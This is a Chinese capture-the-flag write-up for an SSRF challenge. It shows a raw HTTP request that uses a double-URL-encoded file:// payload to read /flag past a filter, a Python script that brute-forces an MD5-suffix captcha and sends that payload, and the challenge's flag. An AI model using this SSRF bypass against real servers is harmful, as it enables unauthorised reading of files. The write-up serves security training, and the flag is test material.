# Ssrf_Me

> md5碰撞与url编码

## 分析

> 打开首页,有2个输入框,一个是url,一个是captcha,根据题目名称可知url处存在SSRF,captcha处输入的字符的md5值最后6位要符合要求,这个用python脚本爆破即可,使用file协议,成功读取index.php源码,可看到禁止访问/flag,这时使用url编码就可以绕过,如果用burp或者python发包,要双重url编码.从而得到flag

## payload

```
POST /index.php HTTP/1.1
Host: 61.147.171.105:61179
Content-Length: 54
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://61.147.171.105:61179
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:61179/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676961379; PHPSESSID=f6c9936233497070229c0fb790c92bfe
Connection: close

url=%66%69%6c%65%3a%2f%2f%2f%25%36%36%25%36%63%25%36%31%25%36%37&captcha=91659
```

```

import os
import re
import time
import hashlib
import requests

# MD5截断数值已知 求原始数据
# 例子 substr(md5(captcha), 0, 6)=60b7ef

def md5(s):  # 计算MD5字符串
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()

def findmd5(md5_str ):    # 输入范围 里面会进行md5测试
    for number in range(0, 1000001):
        if md5(number)[-6:] == md5_str :            # 拿到加密字符串
            return number

headers = {
    'Origin': 'http://61.147.171.105:61179',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36',
    'Referer': 'http://61.147.171.105:61179/index.php',
    'Cookie': 'Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1676961379; PHPSESSID=f6c9936233497070229c0fb790c92bfe'
}

session = requests.Session()
reset_req = session.get('http://61.147.171.105:61179/index.php', headers = headers)
content = reset_req.text
pattern = re.compile(r'<label>Captcha: substr\(md5\(captcha\), -6, 6\) \=\= \"(.*?)\".*?</label>')
md5_str = pattern.findall(content)[0]
if md5_str:
    captcha = findmd5(md5_str)
    if captcha:
        print('获取验证码成功,验证码为: ', captcha)
        data = 'url=%66%69%6c%65%3a%2f%2f%2f%25%36%36%25%36%63%25%36%31%25%36%37&captcha=' + str(captcha)
        proxies = {
            'http': 'http://127.0.0.1:8080'
        }
        post_req = session.post('http://61.147.171.105:61179/index.php', headers = headers, data = data)
        post_content = post_req.text
        print(post_content)
    else:
        print('获取验证码失败!')

session.close()
```
## flag

> cyberpeace{45e9dc3710ad93468230085e50f2a276}